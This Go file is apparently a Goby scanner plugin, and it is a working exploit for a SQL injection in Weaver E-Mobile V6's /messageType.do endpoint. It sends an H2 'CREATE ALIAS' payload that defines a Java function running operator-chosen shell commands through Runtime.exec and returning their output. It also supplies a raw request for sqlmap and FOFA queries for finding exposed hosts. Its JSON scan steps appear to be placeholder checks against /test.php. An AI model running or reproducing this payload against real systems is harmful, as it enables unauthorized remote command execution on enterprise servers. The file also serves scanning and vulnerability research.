package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)


func init() {
	expJson := `{
    "Name": "Weaver-EMobile V6 /messageType.do SQL Injection Vulnerability",
    "Description": "<p>The e-mobile unified mobile platform provides a unified office entrance for mobile Internet users at the user end, and provides a mobile Internet platform for employees, customers, partners, distributors and agents for enterprisesThe system messageType.do have an SQL injection vulnerability, which can be injected into java code for code execution.</p>",
    "Product": "Weaver-EMobile",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-07-04",
    "PostTime": "2024-07-11",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"E-Mobile\" && body=\"Weaver\"",
    "GobyQuery": "body=\"E-Mobile\" && body=\"Weaver\"",
    "Level": "3",
    "Impact": "<p>The system messageType.do have an SQL injection vulnerability, which can be injected into java code for code execution.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.weaver.com.cn/cs/mobileDownload.asp\">https://www.weaver.com.cn/cs/mobileDownload.asp</a></p>",
    "References": [
        "https://github.com/White-hua/Apt_t00ls/blob/52268c288b8bf7268c63009080f55c348effb9e8/src/main/java/exp/oa/weaveroa/weaveroa_mobile6_sqlli.java"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "Code Execution"
    ],
    "VulType": [
        "Code Execution",
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "泛微E-mobile V6 /messageType.do SQL 注入漏洞",
            "Product": "泛微-EMobile",
            "Description": "<p>e-mobile统一移动平台在用户端为移动互联网用户提供办公统一入口，为企业提供面向员工、客户、伙伴、经销商、代理商的移动互联平台<br></p><p>该系统messageType.do存在SQL注入漏洞，该漏洞可以注入java代码实现代码执行。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.weaver.com.cn/cs/mobileDownload.asp\">https://www.weaver.com.cn/cs/mobileDownload.asp</a><br></p>",
            "Impact": "<p>该系统messageType.do存在SQL注入漏洞，该漏洞可以注入java代码实现代码执行。<br></p>",
            "VulType": [
                "SQL注入",
                "代码执行"
            ],
            "Tags": [
                "SQL注入",
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Weaver-EMobile V6 /messageType.do SQL Injection Vulnerability",
            "Product": "Weaver-EMobile",
            "Description": "<p>The e-mobile unified mobile platform provides a unified office entrance for mobile Internet users at the user end, and provides a mobile Internet platform for employees, customers, partners, distributors and agents for enterprisesThe system messageType.do have an SQL injection vulnerability, which can be injected into java code for code execution.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.weaver.com.cn/cs/mobileDownload.asp\">https://www.weaver.com.cn/cs/mobileDownload.asp</a><br></p>",
            "Impact": "<p>The system messageType.do have an SQL injection vulnerability, which can be injected into java code for code execution.<br></p>",
            "VulType": [
                "Code Execution",
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10969"
}`
	setSqlPayloadHash1717551456 := func(hostInfo *httpclient.FixUrl,cmd string) (res string, vulurl string, err error) {
		vulurl = "/messageType.do?method=create&typeName=1"
		makeRequest := httpclient.NewGetRequestConfig(vulurl)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 5
		makeRequest.FollowRedirect = true
		// makeRequest.Header.Store("Content-Type", "application/json;charset=UTF-8")
		// data := `{"id": "961455b47c0b86dc961e90b5893bff05", "apiUrl": "", "params": "{\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(` + sql + `)),1)) or '%%' like '\"}"}`
		// makeRequest.Data = data
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
      if strings.Contains(resp.RawBody, "推送类型已存在") {
        makeRequest.URI="/messageType.do?method=create&typeName=1%27"
        if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
          if strings.Contains(resp.RawBody, "status") {
            if cmd == "nocmd" {
              return "success", vulurl, err
            }
            makeRequest := httpclient.NewPostRequestConfig("/messageType.do")
            makeRequest.VerifyTls = false
            makeRequest.Timeout = 5
            makeRequest.FollowRedirect = true
            makeRequest.Header.Store("Content-Type", "multipart/form-data; boundary=00content0boundary00")
            makeRequest.Header.Store("Accept-Encoding", "deflate")
            //将cmd中的'变为"
            cmd = strings.Replace(cmd, "'", "\"", -1)
            payload :=`';CREATE ALIAS if not exists abcd AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL abcd('`+cmd+`');--`
            makeRequest.Data = "--00content0boundary00\r\nContent-Disposition: form-data; name=\"method\"\r\n\r\ncreate\r\n--00content0boundary00\r\nContent-Disposition: form-data; name=\"typeName\"\r\n\r\n1"+payload+"\r\n--00content0boundary00--"
            if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
              if resp.StatusCode == 200{
                return resp.RawBody, vulurl, err
              }
            }
          }
        }
      }
		}
    err=fmt.Errorf("fail")
		return "fail", vulurl, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			sendPayload := setSqlPayloadHash1717551456
			_, vulurl, err := sendPayload(hostInfo,"nocmd")
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := `POST /messageType.do HTTP/1.1
Host: `+expResult.HostInfo.HostInfo+`
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_371
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 1088
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="method"

create
--00content0boundary00
Content-Disposition: form-data; name="typeName"

1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagm('whoami');--
--00content0boundary00--`
			sendPayload := setSqlPayloadHash1717551456
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "cmd" {
				cmd := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo,cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
          return expResult
				}
				expResult.Success = true
        reRequest := regexp.MustCompile("((.|\n)*?){\"msg\"")
        getserver := reRequest.FindStringSubmatch(resp)
				expResult.Output = getserver[1]
      }else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
